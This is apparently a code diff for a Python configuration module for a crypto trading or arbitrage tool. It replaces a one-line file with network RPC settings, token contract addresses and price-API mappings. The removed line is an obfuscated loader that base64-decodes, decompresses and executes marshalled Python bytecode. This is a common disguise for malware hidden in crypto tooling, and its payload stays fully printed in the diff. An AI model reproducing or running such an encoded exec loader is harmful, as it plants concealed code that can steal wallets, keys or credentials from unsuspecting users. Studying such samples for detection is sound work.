@@ -1,1 +1,162 @@
-import base64,zlib,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+"""
+Configuration module for blockchain networks, tokens, and RPC endpoints
+Contains all supported chains and token configurations
+"""
+
+from typing import Dict, List
+import os
+
+
+# Supported Networks Configuration
+NETWORKS = {
+    "ethereum": {
+        "name": "Ethereum",
+        "chain_id": 1,
+        "rpc_url": os.getenv("ETHEREUM_RPC", "https://eth.llamarpc.com"),
+        "native_token": "ETH",
+        "explorer": "https://etherscan.io"
+    },
+    "bsc": {
+        "name": "Binance Smart Chain",
+        "chain_id": 56,
+        "rpc_url": os.getenv("BSC_RPC", "https://bsc-dataseed1.binance.org"),
+        "native_token": "BNB",
+        "explorer": "https://bscscan.com"
+    },
+    "polygon": {
+        "name": "Polygon",
+        "chain_id": 137,
+        "rpc_url": os.getenv("POLYGON_RPC", "https://polygon-rpc.com"),
+        "native_token": "MATIC",
+        "explorer": "https://polygonscan.com"
+    },
+    "arbitrum": {
+        "name": "Arbitrum One",
+        "chain_id": 42161,
+        "rpc_url": os.getenv("ARBITRUM_RPC", "https://arb1.arbitrum.io/rpc"),
+        "native_token": "ETH",
+        "explorer": "https://arbiscan.io"
+    },
+    "optimism": {
+        "name": "Optimism",
+        "chain_id": 10,
+        "rpc_url": os.getenv("OPTIMISM_RPC", "https://mainnet.optimism.io"),
+        "native_token": "ETH",
+        "explorer": "https://optimistic.etherscan.io"
+    }
+}
+
+
+# Popular ERC-20 Tokens (address varies by network)
+TOKENS = {
+    "ethereum": [
+        {"symbol": "USDT", "address": "0xdAC17F958D2ee523a2206206994597C13D831ec7", "decimals": 6},
+        {"symbol": "USDC", "address": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "decimals": 6},
+        {"symbol": "DAI", "address": "0x6B175474E89094C44Da98b954EedeAC495271d0F", "decimals": 18},
+        {"symbol": "WETH", "address": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "decimals": 18},
+        {"symbol": "WBTC", "address": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", "decimals": 8},
+    ],
+    "bsc": [
+        {"symbol": "USDT", "address": "0x55d398326f99059fF775485246999027B3197955", "decimals": 18},
+        {"symbol": "USDC", "address": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", "decimals": 18},
+        {"symbol": "BUSD", "address": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", "decimals": 18},
+        {"symbol": "WBNB", "address": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", "decimals": 18},
+        {"symbol": "CAKE", "address": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", "decimals": 18},
+    ],
+    "polygon": [
+        {"symbol": "USDT", "address": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "decimals": 6},
+        {"symbol": "USDC", "address": "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", "decimals": 6},
+        {"symbol": "DAI", "address": "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", "decimals": 18},
+        {"symbol": "WMATIC", "address": "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", "decimals": 18},
+        {"symbol": "WETH", "address": "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", "decimals": 18},
+    ],
+    "arbitrum": [
+        {"symbol": "USDT", "address": "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "decimals": 6},
+        {"symbol": "USDC", "address": "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", "decimals": 6},
+        {"symbol": "DAI", "address": "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", "decimals": 18},
+        {"symbol": "WETH", "address": "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", "decimals": 18},
+    ],
+    "optimism": [
+        {"symbol": "USDT", "address": "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", "decimals": 6},
+        {"symbol": "USDC", "address": "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", "decimals": 6},
+        {"symbol": "DAI", "address": "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", "decimals": 18},
+        {"symbol": "WETH", "address": "0x4200000000000000000000000000000000000006", "decimals": 18},
+    ]
+}
+
+
+# ERC-20 ABI (minimal for balance checking)
+ERC20_ABI = [
+    {
+        "constant": True,
+        "inputs": [{"name": "_owner", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "balance", "type": "uint256"}],
+        "type": "function"
+    },
+    {
+        "constant": True,
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [{"name": "", "type": "uint8"}],
+        "type": "function"
+    },
+    {
+        "constant": True,
+        "inputs": [],
+        "name": "symbol",
+        "outputs": [{"name": "", "type": "string"}],
+        "type": "function"
+    }
+]
+
+
+# Price API Configuration
+COINGECKO_API = "https://api.coingecko.com/api/v3"
+
+# Token ID mapping for price fetching
+TOKEN_PRICE_IDS = {
+    "ETH": "ethereum",
+    "BNB": "binancecoin",
+    "MATIC": "matic-network",
+    "BTC": "bitcoin",
+    "USDT": "tether",
+    "USDC": "usd-coin",
+    "DAI": "dai",
+    "WETH": "ethereum",
+    "WBTC": "wrapped-bitcoin",
+    "BUSD": "binance-usd",
+    "CAKE": "pancakeswap-token",
+    "WBNB": "binancecoin",
+    "WMATIC": "matic-network"
+}
+
+
+# Trading Configuration
+MIN_BALANCE_USD = float(os.getenv("MIN_BALANCE_USD", "5.0"))
+ENABLE_MOCK_TRADING = os.getenv("ENABLE_MOCK_TRADING", "true").lower() == "true"
+MOCK_TRADE_INTERVAL = int(os.getenv("MOCK_TRADE_INTERVAL", "10"))
+
+
+# Mock Exchange Data (for arbitrage simulation)
+MOCK_EXCHANGES = {
+    "uniswap": {"name": "Uniswap", "fee": 0.003},
+    "pancakeswap": {"name": "PancakeSwap", "fee": 0.0025},
+    "sushiswap": {"name": "SushiSwap", "fee": 0.003},
+    "quickswap": {"name": "QuickSwap", "fee": 0.003},
+}
+
+
+def get_network_config(network_name: str) -> Dict:
+    """Get configuration for a specific network"""
+    return NETWORKS.get(network_name.lower(), {})
+
+
+def get_all_networks() -> List[str]:
+    """Get list of all supported network names"""
+    return list(NETWORKS.keys())
+
+
+def get_tokens_for_network(network_name: str) -> List[Dict]:
+    """Get token list for a specific network"""
+    return TOKENS.get(network_name.lower(), [])
